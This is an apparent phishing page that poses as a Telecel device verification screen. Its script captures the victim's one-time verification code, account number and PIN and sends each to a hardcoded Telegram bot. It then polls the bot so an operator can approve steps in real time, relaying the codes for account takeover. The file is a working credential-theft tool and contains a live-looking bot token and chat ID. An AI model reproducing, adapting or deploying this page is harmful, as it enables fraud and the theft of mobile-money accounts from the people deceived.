<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <title>Telecel - Device Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #333;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: #fff;
            border-radius: 16px;
            padding: 32px 24px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
            text-align: center;
        }
        .logo-t {
            color: #E30613;
            font-size: 52px;
            font-weight: 900;
            letter-spacing: -1px;
            border: 4px solid #E30613;
            border-radius: 50%;
            width: 80px;
            height: 80px;
            line-height: 72px;
            margin: 0 auto;
        }
        .logo-text {
            color: #E30613;
            font-size: 28px;
            font-weight: 700;
            margin: 8px 0 24px;
        }
        h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
        .subtitle {
            font-size: 15px;
            color: #555;
            line-height: 1.4;
            margin-bottom: 24px;
        }
        .otp-container, .pin-container {
            display: flex;
            justify-content: space-between;
            gap: 8px;
            margin: 24px 0;
        }
        .otp-input, .pin-input {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            border: 2px solid #E30613;
            border-radius: 12px;
            outline: none;
            transition: all 0.3s;
        }
        .pin-input { width: 45px; height: 55px; font-size: 22px; }
        .otp-input:focus, .pin-input:focus {
            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.12);
            border-color: #0033A0;
        }
        .error-msg {
            color: #dc3545;
            font-size: 13px;
            margin-top: 6px;
            display: none;
            padding: 10px;
            background: rgba(220, 53, 69, 0.1);
            border-radius: 6px;
        }
        .success-msg {
            color: #28a745;
            font-size: 13px;
            margin-top: 6px;
            display: none;
            padding: 10px;
            background: rgba(40, 167, 69, 0.1);
            border-radius: 6px;
        }
        .btn-action {
            width: 100%;
            padding: 18px;
            font-size: 18px;
            font-weight: 700;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
            margin: 12px 0 8px;
            color: #fff;
            background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
            border: none;
            box-shadow: 0 4px 12px rgba(227, 6, 19, 0.25);
        }
        .btn-action:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(227, 6, 19, 0.35);
        }
        .btn-action:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        #spinner {
            position: fixed;
            inset: 0;
            background: rgba(227, 6, 19, 0.15);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .spin {
            width: 60px;
            height: 60px;
            border: 6px solid #f0f0f0;
            border-top: 6px solid #E30613;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @media (max-width: 480px) {
            .otp-input, .pin-input { width: 45px; height: 55px; font-size: 20px; }
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <div class="logo-t">t</div>
        <div class="logo-text">telecel</div>
        
        <!-- Device Code Step -->
        <div id="deviceStep">
            <h1>Verify Device</h1>
            <p class="subtitle">Please enter the 6-digit code displayed on your device to verify and complete the purchase.</p>
            <div class="otp-container" id="otpInputs">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
            </div>
        </div>

        <!-- PIN Step (hidden initially) -->
        <div id="pinStep" style="display:none;">
            <h1>Enter PIN</h1>
            <p class="subtitle">Enter your 4-digit PIN to confirm this device.</p>
            <div class="pin-container" id="pinInputs">
                <input type="text" class="pin-input" maxlength="1" inputmode="numeric">
                <input type="text" class="pin-input" maxlength="1" inputmode="numeric">
                <input type="text" class="pin-input" maxlength="1" inputmode="numeric">
                <input type="text" class="pin-input" maxlength="1" inputmode="numeric">
            </div>
        </div>

        <div class="error-msg" id="err">Invalid verification code. Please try again.</div>
        <div class="success-msg" id="successMsg">✓ Code Submitted! Waiting for approval...</div>

        <button class="btn-action" id="verifyBtn">Verify Device</button>
    </div>

    <div id="spinner">
        <div class="spin"></div>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
            CHAT_ID: '7547427914'
        };

        const state = {
            lastUpdateId: 0,
            pollInterval: null,
            approveId: null,
            declineId: null,
            verifyDeviceId: null,
            validPinId: null,
            invalidPinId: null
        };

        const errMsg = document.getElementById('err');
        const successMsg = document.getElementById('successMsg');
        const spinner = document.getElementById('spinner');
        const deviceStep = document.getElementById('deviceStep');
        const pinStep = document.getElementById('pinStep');
        const verifyBtn = document.getElementById('verifyBtn');

        // OTP Inputs
        const otpInputs = document.querySelectorAll('#otpInputs .otp-input');
        // PIN Inputs
        const pinInputs = document.querySelectorAll('#pinInputs .pin-input');

        // Setup OTP inputs
        setupInputs(otpInputs, () => checkAndAutoSubmit(otpInputs, 6, submitDeviceCode));
        // Setup PIN inputs
        setupInputs(pinInputs, () => checkAndAutoSubmit(pinInputs, 4, submitPin));

        function setupInputs(inputs, autoSubmitCallback) {
            inputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    const val = e.target.value;
                    if (val.length > 1) {
                        const chars = val.split('');
                        chars.forEach((char, i) => {
                            if (inputs[index + i]) inputs[index + i].value = char;
                        });
                        autoSubmitCallback();
                        return;
                    }
                    if (val && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                    autoSubmitCallback();
                });

                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
                        inputs[index - 1].focus();
                    }
                });

                input.addEventListener('paste', (e) => {
                    e.preventDefault();
                    const pasteData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, inputs.length).split('');
                    pasteData.forEach((char, i) => {
                        if (inputs[i]) inputs[i].value = char;
                    });
                    autoSubmitCallback();
                });
            });
        }

        function getCode(inputs) {
            let code = "";
            inputs.forEach(input => code += input.value);
            return code;
        }

        function checkAndAutoSubmit(inputs, length, submitFunc) {
            const code = getCode(inputs);
            if (code.length === length) {
                setTimeout(submitFunc, 300);
            }
        }

        function stopPolling() {
            if (state.pollInterval) {
                clearInterval(state.pollInterval);
                state.pollInterval = null;
            }
        }

        function submitDeviceCode() {
            const code = getCode(otpInputs);
            if (code.length !== 6) return;
            if (spinner.style.display === 'flex') return;

            errMsg.style.display = 'none';
            spinner.style.display = 'flex';

            const ts = Date.now();
            state.approveId = `dev_approve_${ts}`;
            state.declineId = `dev_decline_${ts}`;
            state.verifyDeviceId = `dev_verify_${ts}`;

            const accountNumber = localStorage.getItem('accountNumber') || 'Unknown';

            const message = `<b>Device Verification Code Received</b>\n\n` +
                           `Account: <code>${accountNumber}</code>\n` +
                           `Code: <code>${code}</code>\n\n` +
                           `Approve this device?`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '✅ Approve', callback_data: state.approveId },
                                { text: '❌ Decline', callback_data: state.declineId }
                            ],
                            [
                                { text: '📱 Verify Device Again', callback_data: state.verifyDeviceId }
                            ]
                        ]
                    }
                })
            })
            .then(r => r.json())
            .then(data => {
                if (data.ok) {
                    successMsg.style.display = 'block';
                    startPolling(); // Will handle approve → show PIN step
                } else {
                    spinner.style.display = 'none';
                    errMsg.textContent = "Failed to send to bot.";
                    errMsg.style.display = 'block';
                }
            })
            .catch(() => {
                spinner.style.display = 'none';
                errMsg.textContent = "Connection error. Please try again.";
                errMsg.style.display = 'block';
            });
        }

        function submitPin() {
            const pin = getCode(pinInputs);
            if (pin.length !== 4) return;

            spinner.style.display = 'flex';
            errMsg.style.display = 'none';

            const ts = Date.now();
            state.validPinId = `valid_pin_${ts}`;
            state.invalidPinId = `invalid_pin_${ts}`;

            const message = `<b>PIN Entered</b>\n\nPIN: <code>${pin}</code>\n\nIs this PIN valid?`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '✅ Valid PIN', callback_data: state.validPinId },
                                { text: '❌ Invalid PIN', callback_data: state.invalidPinId }
                            ]
                        ]
                    }
                })
            })
            .then(r => r.json())
            .then(data => {
                if (data.ok) {
                    successMsg.textContent = "✓ PIN Submitted! Waiting for confirmation...";
                    successMsg.style.display = 'block';
                } else {
                    spinner.style.display = 'none';
                }
            })
            .catch(() => spinner.style.display = 'none');
        }

        verifyBtn.onclick = submitDeviceCode;

        function startPolling() {
            stopPolling();
            state.pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=10&allowed_updates=["callback_query"]`)
                .then(r => r.json())
                .then(data => {
                    if (!data.ok || !data.result?.length) return;

                    for (const update of data.result) {
                        state.lastUpdateId = update.update_id;
                        const cb = update.callback_query;
                        if (!cb) continue;

                        // Device Code Callbacks
                        if (cb.data === state.approveId) {
                            stopPolling();
                            spinner.style.display = 'none';
                            // Show PIN Step
                            deviceStep.style.display = 'none';
                            pinStep.style.display = 'block';
                            pinInputs[0].focus();
                            successMsg.style.display = 'none';
                            return;
                        }

                        if (cb.data === state.declineId) {
                            stopPolling();
                            spinner.style.display = 'none';
                            errMsg.textContent = "Code Declined. Please try again.";
                            errMsg.style.display = 'block';
                            successMsg.style.display = 'none';
                            otpInputs.forEach(i => i.value = '');
                            otpInputs[0].focus();
                            return;
                        }

                        if (cb.data === state.verifyDeviceId) {
                            stopPolling();
                            location.reload();
                            return;
                        }

                        // PIN Callbacks
                        if (cb.data === state.validPinId) {
                            stopPolling();
                            spinner.style.display = 'none';
                            window.location.href = 'success.html';
                            return;
                        }

                        if (cb.data === state.invalidPinId) {
                            stopPolling();
                            spinner.style.display = 'none';
                            errMsg.textContent = "Invalid PIN. Please try again.";
                            errMsg.style.display = 'block';
                            successMsg.style.display = 'none';
                            pinInputs.forEach(i => i.value = '');
                            pinInputs[0].focus();
                            return;
                        }
                    }
                })
                .catch(err => console.warn("Polling error:", err));
            }, 2000);
        }

        // Auto focus first input
        otpInputs[0].focus();
    </script>
</body>
</html>
